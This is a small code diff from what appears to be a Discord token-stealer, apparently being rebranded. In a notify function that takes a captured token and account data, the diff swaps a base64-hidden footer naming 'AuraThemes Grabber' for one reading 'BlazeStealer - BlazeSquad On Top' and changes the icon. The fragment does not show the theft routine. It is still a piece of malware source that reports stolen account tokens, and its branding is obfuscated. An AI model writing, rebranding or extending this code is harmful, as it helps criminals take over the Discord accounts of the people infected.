@@ -187,8 +187,8 @@ const notify = async (ctx, token, acc) => {
             icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
         };
         e.footer = {
-            text: decodeB64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
-            icon_url: "https://i.imgur.com/yVnOSeS.gif",
+            text: decodeB64('QmxhemVTdGVhbGVyIC0gQmxhemVTcXVhZCBPbiBUb3A'),
+            icon_url: "https://cdn.discordapp.com/attachments/1121402027369566262/1225003121563013120/demon.gif",
         };
     });
 
